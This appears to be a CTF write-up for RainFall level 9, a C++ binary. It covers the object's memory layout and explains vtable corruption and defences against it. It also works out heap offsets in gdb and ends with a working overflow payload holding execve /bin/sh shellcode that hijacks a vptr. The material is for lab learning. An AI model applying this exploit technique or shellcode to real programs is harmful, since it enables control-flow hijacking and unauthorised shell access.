# Level 9

## 🏗️ Binary Analysis & Class Structure

checking vtable:

```nasm
level9@RainFall:~$ objdump -t ./level9 | grep _ZTV
08049b80  w    O .bss	0000002c              _ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3
08048840  w    O .rodata	00000010              _ZTV1N
```


### 📐 Memory Layout of Class `N`

An object of class `N` occupies a total size of **108 bytes (`0x6c`)** on the Heap. Its layout in memory is structured as follows:

| Offset (Hex) | Offset (Dec) | Size | Type / Field | Description |
| :--- | :--- | :--- | :--- | :--- |
| **`0x00` - `0x03`** | `0` - `3` | 4 bytes | `void**` (**`vptr`**) | Pointer to the Virtual Method Table (`VTable`) of class `N` (`_ZTV1N`). |
| **`0x04` - `0x67`** | `4` - `103` | 100 bytes | `char[100]` (**`annotation`**) | Fixed buffer/array intended to store the string passed to `setAnnotation`. |
| **`0x68` - `0x6B`** | `104` - `107` | 4 bytes | `int` (**`value`**) | Integer passed to the constructor `N::N(this, int)` (e.g., `5` for 1st object, `6` for 2nd).



## What is Vtable Corruption? (C++ Exploitation Guide)

**Vtable corruption** (or virtual table hijacking) is a classic exploitation technique used in C++ binaries. It occurs when an attacker overwrites a virtual table pointer (`vptr`) inside an object's memory structure to hijack the application's control flow and execute arbitrary code.

To understand corruption, you first need to understand how C++ handles **polymorphism** using virtual functions (`virtual` keyword):

1. **The `vptr` (Virtual Table Pointer):** Every object that contains virtual functions holds a hidden pointer called `vptr` typically located at the very beginning of the object's memory structure (offset `0`).
2. **The `vtable` (Virtual Table):** The `vptr` points to a table of function pointers (`vtable`) belonging to that class.
3. **Dynamic Dispatch:** When you call a virtual function (e.g., `obj->foo()`), the compiler doesn't call the function directly. Instead, it looks up the function's address inside the `vtable`:
   $$\text{Address} = \text{*}(\text{obj} \to \text{vptr} + \text{offset})$$

---

## 💥 What is Vtable Corruption?

If a program suffers from a vulnerability like a **buffer overflow** or **heap corruption**, an attacker can write data past the intended buffer boundaries. 

If this overflow reaches an adjacent object's header, the attacker can overwrite its **`vptr`** with a controlled value (such as an address pointing to a malicious shellcode or a ROP chain).

### The Attack Mechanism

1. **The Overwrite:** The attacker floods a buffer, replacing the legitimate `vptr` of an object with a fake address chosen by the attacker.
2. **The Method Call:** The program later attempts to invoke a virtual method on that corrupted object.
3. **The Hijack:** 
   * The CPU follows the hijacked `vptr` to find the function address.
   * Because the `vptr` now points to attacker-controlled memory instead of a valid vtable, the CPU reads the fake address.
   * Control flow is redirected straight to the attacker's shellcode.

---

## 📊 Normal vs. Corrupted Memory Layout

| Memory State | Object Structure | Description |
| :--- | :--- | :--- |
| **Normal State** | `[ vptr ]` $\rightarrow$ Points to valid `vtable` $\rightarrow$ Safe execution of member functions. |
| **Corrupted State**| `[ Fake vptr ]` $\rightarrow$ Points to attacker buffer/shellcode $\rightarrow$ **Control flow hijacked!** |

---

## 🛡️ Mitigation & Defense

Modern compilers and operating systems implement protections to detect and prevent vtable corruption:

* **vptr Integrity Checking:** Compilers insert checks to verify that a `vptr` points to a valid, read-only `.rodata` segment containing legitimate vtables before making a virtual call (e.g., Clang's `-fsanitize=vptr` or Control Flow Integrity / CFI).
* **ASLR (Address Space Layout Randomization):** Randomizes memory locations, making it harder to reliably guess fake vtable or shellcode addresses.
* **DEP / NX (Data Execution Prevention):** Marks heap and stack memory as non-executable, preventing direct shellcode execution from buffers.



## Heap Allocation & Offsets Calculation

call operator new

```bash
0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
```

address of this

```bash
	(gdb) break *0x0804861c
	(gdb) print/x $eax
	$1 = 0x804a008
```

0x804a008 = address memory of first vptr
0x804b078 = address memory of second vptr
```bash
	(gdb) print/x *(int*)($esp + 0x1c)
	$2 = 0x804a008
	(gdb) print/x *(int*)($esp + 0x18)
	$3 = 0x804a078
	(gdb) print/x 0x804b078 - 0x804b008
	$4 = 0x70
```
$$112 - 4 = 108 \text{ octets}$$

payload test 
```bash
run $(python -c 'print "A"*108 + "B" *4')
```
(gdb) x/wx *(int*)($esp + 0x10)
0x804a078:	0x42424242

padding is good. we have correctly overwrite the second vptr


## How the Double Dereference Triggers the Payload



```c
(*(code *)**(undefined4 **)this_00)(this_00,this);
```
equivalent to 
```c
obj2->operator+(*obj1)
```


**(undefined4 **)this_00)

double pointer so:
0x804a008 + 4 = 0x0804a00c
0x0804a00c + 4 = 0x0804a010

(gdb) print/x *(int*)($esp + 0x1c) + 4
$4 = 0x804a00c


$$0x0804a010$$
$$0x0804a00c$$

after deferencing 0x0804a010 is the beginning of the shellcode.it execute the shellcode which is located at this address exactly.
The address 0x0804a00c acts as the critical bridge at the end of the shellcode layout, holding the secondary pointer value required to complete the double pointer dereference chain and successfully jump into execution.


### 🧠 Memory Layout & Structure

The following table maps out how the payload is structured in memory to achieve the double pointer dereference and vtable overwrite:

| Memory Address | Normal C++ Element | Exploit Element (Injected) | Role & Description |
| :--- | :--- | :--- | :--- |
| **`0x0804a008`** | `obj1`'s `vptr` | `\x10\xa0\x04\x08` | Address pointing directly to your **shellcode** (the final landing zone). |
| **`0x0804a00c`** | `obj1` Data / Buffer | `\x0c\xa0\x04\x08` | Linking address used as the intermediate target for the double dereference. |
| **`0x0804a010`** | `obj1` Buffer Continuation | Shellcode (`\x31\xc0...`) | The actual machine code executed by the CPU. |
| *... (middle)* | *Standard Padding* | `"A" * 79` | Fills the intermediate heap space to reach `obj2`. |
| **`End of Buffer`** | `obj2`'s original `vptr` | `\x0c\xa0\x04\x08` | The fake `vptr` that traps `obj2` and forces the call toward `0x0804a00c`. |

---

## Payload
```bash
	$(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A"*79 + "\x0c\xa0\x04\x08"')
```